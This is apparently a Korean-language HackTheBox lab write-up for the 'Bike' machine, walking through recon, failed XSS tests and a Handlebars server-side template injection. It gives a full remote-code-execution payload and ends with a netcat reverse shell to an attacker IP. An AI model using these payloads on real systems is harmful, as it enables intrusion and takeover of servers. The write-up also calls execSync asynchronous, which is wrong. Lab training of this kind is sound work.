# Bike - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA bike 10.129.97.64
```
<img width="1108" height="407" alt="image" src="https://github.com/user-attachments/assets/a3249387-1879-4fd3-887b-8e2df9f7c2b4" />

- SSH(22)
- HTTP(80)

---
## banner grabbing
```bash
whatweb http://10.129.97.64

curl -IL http://10.129.97.64
```
<img width="1108" height="286" alt="image" src="https://github.com/user-attachments/assets/3101ffa6-a242-495d-8c5f-38d1d122301f" />

## HTTP(80)
<img width="800" height="290" alt="image" src="https://github.com/user-attachments/assets/d7683cc5-0f12-403d-ba48-b4444a59cf82" />

- directory를 찾아보려 했으나 실패.
```bash
gobuster dir -u http://10.129.97.64 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium
.txt
```
<br>

- `xss` 취약점이 있는지 테스트 했으나 실패.
```html
<script>alert(windows.origin)</script>
<img src=x onload=alert('XSS')>
```

---
## SSTI(Server Side Template Injection)
```html
{{7*7}}
```
- SSTI 공격을 시도.
- `/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19` 오류 메세지에시 `handlebars` 템플릿을 사용한다는 것을 확인.
<img width="1200" height="111" alt="image" src="https://github.com/user-attachments/assets/41b1bfd8-a65b-47a6-a613-9acca1c9b356" />

<br>
<br>

- https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/
- `HackTricks`에 적혀있는 Handlerbars RCE payload를 시도.(URL ENCODED)
- 오류 메시지를 확인해보면 `require`이 정의되지 않았다고 한다.
```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
<img width="1550" height="574" alt="image" src="https://github.com/user-attachments/assets/83e5f51f-3f72-44b2-b520-5d7961209f05" />

<br>
<br>

- `Node.js`환경에서는 `process` 객체가 전역으로 존재하며, `process.mainModule.require`를 통해서 모듈을 로드할 수 있게 된다.
- payload를 변경해서 URL ENCODING을 거친 후에 실행
- injection이 성공했지만, 결과가 제대로 나오지 않음.
```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
<img width="1550" height="676" alt="image" src="https://github.com/user-attachments/assets/9c686b17-ec2b-4f9a-8abb-31b98d2fc254" />

<br>
<br>

- SSTI 공격에서 동기 함수를 사용하게 되면 HTTP 응답을 받은 뒤에 처리가 되기 때문에 비동기 함수인 `execSync`를 사용해서 응답을 받으면 정상 작동.
```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
<img width="1550" height="676" alt="image" src="https://github.com/user-attachments/assets/6a0bf97a-60c6-46db-aa56-d681aa4f62a4" />

<br>
<br>

- reverse shell 코드를 사용하여 셸 획득
- `/root`에서 flag 획득
```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.240 80 >/tmp/f');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
<img width="1109" height="488" alt="image" src="https://github.com/user-attachments/assets/a4b03d2e-372f-48f2-8bcd-6d2d6b2febce" />
